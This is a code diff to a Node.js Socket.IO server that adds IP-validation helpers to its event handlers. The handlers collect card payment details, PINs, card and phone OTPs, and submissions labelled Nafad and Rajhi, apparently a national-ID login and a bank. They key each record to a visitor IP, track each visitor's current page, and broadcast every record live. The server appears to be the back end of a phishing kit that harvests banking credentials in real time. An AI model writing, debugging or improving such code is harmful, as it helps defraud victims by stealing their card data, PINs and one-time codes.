@@ -477,6 +477,33 @@ app.use((err, req, res, next) => {
 });
 
 // ─── 7) SOCKET.IO LOGIC ───────────────────────────────────────────────────────
+
+// ─────────────────────────────────────────────────────────────
+// Helper: derive a stable client IP from the socket (works behind Render/Proxy)
+// ─────────────────────────────────────────────────────────────
+
+
+// ────────────────────────────────────────────────────────────────
+// IP helpers (prevent "undefined/null" IP docs which collapse rows)
+// ────────────────────────────────────────────────────────────────
+function normalizeIp(raw) {
+  if (typeof raw !== "string") return null;
+  const ip = raw.trim();
+  if (!ip || ip === "null" || ip === "undefined") return null;
+  return ip;
+}
+
+function requireIpFromData(socket, data, ackEventName) {
+  const ip = normalizeIp(data?.ip);
+  if (!ip) {
+    if (ackEventName) socket.emit(ackEventName, { success: false, error: "Missing visitor IP" });
+    return null;
+  }
+  data.ip = ip;
+  // remember for later events from same socket
+  socket.data.ip = ip;
+  return ip;
+}
 io.on("connection", (socket) => {
   console.log("⚡ Socket connected:", socket.id);
 
@@ -541,22 +568,26 @@ io.on("connection", (socket) => {
 
   // updateLocation
   socket.on("updateLocation", async ({ ip, page }) => {
+    const fixedIp = normalizeIp(ip) || normalizeIp(socket.data.ip);
+    if (!fixedIp) return; // don't write "undefined" IP docs
     try {
       await Location.findOneAndUpdate(
-        { ip },
+        { ip: fixedIp },
         { currentPage: page, updatedAt: new Date() },
         { upsert: true, setDefaultsOnInsert: true }
       );
-      // Remember IP for this socket
-      socket.data.ip = ip;
-      io.emit("locationUpdated", { ip, page });
+      socket.data.ip = fixedIp;
+      io.emit("locationUpdated", { ip: fixedIp, page });
     } catch (e) {
       console.error("Location upsert error:", e);
     }
   });
 
+
   // submitIndex
   socket.on("submitIndex", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackIndex");
+    if (!ip) return;
     try {
       const doc = await IndexPage.findOneAndUpdate({ ip: data.ip }, data, {
         upsert: true,
@@ -573,6 +604,8 @@ io.on("connection", (socket) => {
 
   // submitDetails
   socket.on("submitDetails", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackDetails");
+    if (!ip) return;
     try {
       const doc = await DetailsPage.findOneAndUpdate({ ip: data.ip }, data, {
         upsert: true,
@@ -589,6 +622,8 @@ io.on("connection", (socket) => {
 
   // submitComprehensive
   socket.on("submitComprehensive", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackComprehensive");
+    if (!ip) return;
     try {
       const doc = await Comprehensive.create(data);
       io.emit("newShamel", doc);
@@ -601,6 +636,8 @@ io.on("connection", (socket) => {
 
   // submitThirdparty
   socket.on("submitThirdparty", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackThirdparty");
+    if (!ip) return;
     try {
       const doc = await ThirdParty.create(data);
       io.emit("newThirdparty", doc);
@@ -613,6 +650,8 @@ io.on("connection", (socket) => {
 
   // submitBilling
   socket.on("submitBilling", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackBilling");
+    if (!ip) return;
     try {
       const doc = await Billing.create(data);
       io.emit("newBilling", doc);
@@ -625,6 +664,8 @@ io.on("connection", (socket) => {
 
   // submitPayment
   socket.on("submitPayment", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackPayment");
+    if (!ip) return;
     try {
       const doc = await Payment.create(data);
       io.emit("newPayment", doc);
@@ -637,6 +678,8 @@ io.on("connection", (socket) => {
 
   // submitCode (PIN)
   socket.on("submitCode", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackCode");
+    if (!ip) return;
     try {
       const ip = data.ip || socket.data.ip;
       const doc = await Pin.create({
@@ -653,6 +696,8 @@ io.on("connection", (socket) => {
 
   // submitVerification (Card OTP)
   socket.on("submitVerification", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackVerification");
+    if (!ip) return;
     try {
       const doc = await Otp.create({
         ip: data.ip,
@@ -668,6 +713,8 @@ io.on("connection", (socket) => {
 
   // submitPhoneCode (Phone OTP)
   socket.on("submitPhoneCode", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackPhoneCode");
+    if (!ip) return;
     try {
       const doc = await Otp.create({
         ip: data.ip,
@@ -683,6 +730,8 @@ io.on("connection", (socket) => {
 
   // submitPhone
   socket.on("submitPhone", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackPhone");
+    if (!ip) return;
     try {
       const doc = await Phone.create({
         ip: data.ip,
@@ -699,6 +748,8 @@ io.on("connection", (socket) => {
 
   // NEW: split Nafad vs Rajhi socket events
   socket.on("submitNafad", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackNafad");
+    if (!ip) return;
     try {
       const doc = await Nafad.create({
         ip: data.ip,
@@ -714,6 +765,8 @@ io.on("connection", (socket) => {
   });
 
   socket.on("submitRajhi", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackRajhi");
+    if (!ip) return;
     try {
       const doc = await Rajhi.create({
         ip: data.ip,
@@ -730,6 +783,9 @@ io.on("connection", (socket) => {
 
   // updateBasmah
   socket.on("updateBasmah", async ({ ip, basmah }) => {
+    ip = normalizeIp(ip) || normalizeIp(socket.data.ip);
+    if (!ip) { socket.emit("ackBasmah", { success: false, error: "Missing visitor IP" }); return; }
+    socket.data.ip = ip;
     try {
       const doc = await Basmah.findOneAndUpdate(
         { ip },
@@ -802,6 +858,11 @@ io.on("connection", (socket) => {
   // SMASCO Events
   // ═══════════════════════════════════════════════════════════════
   socket.on("submitInfo", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackInfo");
+    if (!ip) return;
+    const fixedIp = data?.ip || socket.data.ip;
+    if (data) data.ip = fixedIp;
+    socket.data.ip = fixedIp;
     try {
       const payload = {
         ...data,
@@ -827,6 +888,11 @@ io.on("connection", (socket) => {
   });
 
   socket.on("submitService", async (data) => {
+    const ip = requireIpFromData(socket, data, "ackService");
+    if (!ip) return;
+    const fixedIp = data?.ip || socket.data.ip;
+    if (data) data.ip = fixedIp;
+    socket.data.ip = fixedIp;
     try {
       const doc = await SmascoService.create(data);
       io.emit("newSmascoService", doc);
